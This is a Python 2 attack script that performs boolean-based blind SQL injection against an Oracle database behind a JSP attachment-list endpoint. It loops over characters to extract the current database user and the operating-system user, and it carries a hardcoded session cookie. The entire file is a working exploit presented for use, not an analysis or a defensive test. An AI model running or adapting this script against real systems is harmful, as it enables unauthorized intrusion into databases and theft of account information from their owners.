#!/usr/bin/env python
# -*- coding: utf-8 -*-


import time
import requests


key = "AndroidDownloadFile"

url = "http://1.1.1.1/sfgs/android/Adjunctlist.jsp?fileflag=1&tablename=t_scoa_sys_file&dataid=2"


header = {
    "User-Agent": "Mozilla/5.0 (Windows NT 6.1; WOW64; rv:45.0) Gecko/20100101 Firefox/45.0",
    "Cookie": "JSESSIONID=DDC52542B7450188D4C152B620BEE229",
    "Accept": ""
}

payloads = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghigklmnopqrstuvwxyz0123456789@_.'

def getLength(info):
    '''
    :param info: 准备爆出user或者os字符串
    :return:     字符串的长度
    '''
    payload = " AND length(SYS_CONTEXT('USERENV','" + info + "'))="
    for i in range(30):
        try:
            # AND length(SYS_CONTEXT('USERENV','CURRENT_USER'))=1--
            r = requests.get(url + payload + str(i) + "-- ", headers=header, allow_redirects=False, timeout=10)
            res = r.text
            if res.find(key) > 0:
                return i
                break
        except:
            try:
                r = requests.get(url + payload + str(i) + "-- ", headers=header, allow_redirects=False, timeout=10)
                res = r.text
                if res.find(key) > 0:
                    print res
                    return i
                    break
            except Exception as e:
                print e


def get_CURRENT_USER():
    count = getLength("CURRENT_USER")
    user = ''
    for i in range(count + 1):
        for exp in list(payloads):
            time.sleep(0.5)
            try:
                payload = " AND substr(SYS_CONTEXT('USERENV','CURRENT_USER'),%s,1)='%s' AND 7=7-- " % (i,exp)
                r = requests.get(url + payload, headers=header, allow_redirects=False, timeout=10)
                res = r.text
                if res.find(key) > 0:
                    user += exp
                    print ('CURRENT_USER IS:', user)
                    break
            except:
                pass
    print ('ORACLE USER IS %s' % user)



def get_OS_USER():
    count = getLength("OS_USER")
    user = ''
    for i in range(1, count + 1, 1):
        for exp in list(payloads):
            time.sleep(0.5)
            try:
                payload = " AND substr(SYS_CONTEXT('USERENV','OS_USER'),%s,1)='%s' AND 7=7--" % (i, ''.join(exp))
                r = requests.get(url + payload, headers=header, allow_redirects=False, timeout=10)
                res = r.text
                if res.find(key) > 0:
                    user += exp
                    print ('OS_USER IS:', user)
                    break
            except:
                pass
    print ('ORACLE OS_USER is %s' % user)


if __name__ == '__main__':
    get_CURRENT_USER()
    get_OS_USER()
